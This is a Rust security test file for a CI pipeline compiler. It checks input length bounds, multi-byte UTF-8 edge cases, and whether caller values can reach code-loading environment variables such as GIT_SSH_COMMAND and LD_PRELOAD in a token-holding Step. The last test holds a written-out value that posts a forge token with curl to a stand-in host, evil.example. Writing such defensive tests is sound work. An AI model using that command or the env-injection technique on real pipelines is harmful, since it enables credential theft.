//! Red team round 2 on `${{ event.* }}` and `forge_token` Steps (ADR-0076
//! §9, HEAD 8f4a7679): the length bounds at their edges, and what a value
//! from outside can still reach in a Step that holds the token now that its
//! image and command must be literal. Each test asserts the SECURE
//! behaviour: a failing test is a break.

use std::collections::BTreeMap;

use scarab_pipeline::event::check_value;
use scarab_pipeline::{
    compile_with_libraries, InstalledLibrary, Libraries, PipelineError, PipelineIr,
};
use serde_json::json;

fn compile(yaml: &str, libs: &Libraries) -> Result<PipelineIr, Vec<String>> {
    match compile_with_libraries(yaml, libs) {
        Ok(ir) => Ok(ir),
        Err(PipelineError::Validation(d)) => Err(d),
        Err(e) => Err(vec![e.to_string()]),
    }
}

fn installed(name: &str, content: &str) -> Libraries {
    Libraries {
        files: BTreeMap::new(),
        installed: BTreeMap::from([(
            name.to_string(),
            InstalledLibrary {
                content: content.to_string(),
                source: format!("github.com/acme/libs//x.yaml@{}", "1".repeat(40)),
            },
        )]),
    }
}

/// ATTACK: each bounded field at exactly its limit (accepted) and one byte
/// over (refused).
#[test]
fn rt2_each_bound_holds_at_its_edge() {
    let cases: [(&str, usize, char); 5] = [
        ("kind", 32, 'a'),
        ("run", 64, 'a'),
        ("repo.owner", 100, 'a'),
        ("repo.name", 100, 'a'),
        ("branch", 255, 'a'),
    ];
    for (field, max, c) in cases {
        let at: String = std::iter::repeat(c).take(max).collect();
        let over: String = std::iter::repeat(c).take(max + 1).collect();
        assert!(check_value(field, &json!(at)).is_ok(), "{field} at {max} refused");
        assert!(check_value(field, &json!(over)).is_err(), "{field} at {} accepted", max + 1);
    }
    for field in ["ref", "tag"] {
        let at = format!("refs/{}", "a".repeat(250));
        assert_eq!(at.len(), 255);
        assert!(check_value(field, &json!(at)).is_ok(), "{field} at 255 refused");
        assert!(check_value(field, &json!(format!("{at}a"))).is_err(), "{field} at 256 accepted");
    }
    let url = |n: usize| format!("https://git.example.com/{}", "a".repeat(n - 24));
    assert_eq!(url(2048).len(), 2048);
    assert!(check_value("repo.clone_url", &json!(url(2048))).is_ok());
    assert!(check_value("repo.clone_url", &json!(url(2049))).is_err());
}

/// ATTACK: multi-byte UTF-8 straddling each limit: a value whose CHARACTER
/// count is under the limit and whose byte count is over, and the refusal
/// message that cuts the value at 40 characters. Refused, never a panic.
#[test]
fn rt2_multi_byte_values_at_the_edge_are_refused_without_a_panic() {
    for (field, max) in [("kind", 32), ("run", 64), ("repo.owner", 100), ("branch", 255)] {
        // `é` is two bytes: max/2 + 1 characters is just over in bytes.
        let v: String = "é".repeat(max / 2 + 1);
        assert!(v.chars().count() <= max && v.len() > max);
        let r = std::panic::catch_unwind(|| check_value(field, &json!(v)));
        assert!(matches!(r, Ok(Err(_))), "{field}: {r:?}");
        // Under the byte limit too: refused for its characters.
        let short: String = "é".repeat(2);
        assert!(check_value(field, &json!(short)).is_err(), "{field} accepted non-ASCII");
        // A 4-byte character placed where the 40-character cut lands.
        let mixed = format!("{}{}", "a".repeat(39), "𝔵".repeat(60));
        let r = std::panic::catch_unwind(|| check_value(field, &json!(mixed)));
        assert!(matches!(r, Ok(Err(_))), "{field}: {r:?}");
    }
}

/// ATTACK: the round-1 fix makes the image and command of a `forge_token`
/// Step literal and routes outside values through `env:` only, on the
/// premise that an env value is data. Some env NAMES make their value code
/// in the token's container: git runs `GIT_SSH_COMMAND` / `GIT_PROXY_COMMAND`
/// / `GIT_ASKPASS`, reads config (`core.sshCommand`, `core.fsmonitor`,
/// `credential.helper`) from `GIT_CONFIG_PARAMETERS` and `GIT_CONFIG_*`,
/// the loader runs `LD_PRELOAD`, `sh` sources `ENV` / `BASH_ENV`. A library
/// from a source the org trusts that binds a caller's `with:` value to one
/// of these names lets the repository choose code that runs beside the
/// long-lived token. Such a binding on a `forge_token` Step must be a
/// compile error, whatever the input's `validate:` says.
#[test]
#[ignore = "red: s3 r2"]
fn rt2_a_caller_value_may_not_reach_a_code_loading_env_name_of_a_token_step() {
    let mut compiled = Vec::new();
    for name in [
        "GIT_SSH_COMMAND",
        "GIT_PROXY_COMMAND",
        "GIT_ASKPASS",
        "GIT_CONFIG_PARAMETERS",
        "GIT_CONFIG_VALUE_0",
        "LD_PRELOAD",
        "BASH_ENV",
        "ENV",
        "PATH",
        "HOME",
    ] {
        let lib = format!(
            r#"kind: library
interface:
  inputs:
    - {{ name: v, type: string, validate: 'value.size() > 0' }}
steps:
  - id: git
    image: "alpine/git@sha256:0000000000000000000000000000000000000000000000000000000000000000"
    command: [git, fetch, origin]
    env: [[{name}, "${{{{ inputs.v }}}}"]]
    forge_token: read
"#
        );
        let yaml = r#"
on: { push: {} }
steps:
  - { id: t, invoke: lib:acme/git, with: { v: "sh -c 'curl -d @/scarab/secrets/forge-token evil.example'" } }
"#;
        if compile(yaml, &installed("acme/git", &lib)).is_ok() {
            compiled.push(name);
        }
    }
    assert!(
        compiled.is_empty(),
        "a caller's value reaches these env names of a forge_token Step: {compiled:?}"
    );
}
